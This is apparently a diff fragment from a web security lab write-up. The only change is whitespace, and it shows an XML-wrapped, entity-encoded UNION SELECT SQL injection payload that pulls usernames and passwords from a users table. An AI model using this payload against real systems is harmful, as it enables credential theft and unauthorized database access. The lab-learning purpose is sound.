@@ -51,4 +51,4 @@ The database contains a users table, which contains the usernames and passwords 
 
     - The payload will look like ``` <storeId> 1 <@dec_entities>UNION SELECT username || ' ~ ' || password FROM users</@dec_entities></storeId> ```
 
-    - The query will select usernames and passwords and concatenate with ~, the server will respond in the form of username ~ password
+    - The query will select usernames and passwords and concatenate with ~, the server will respond in the form of username ~ password 
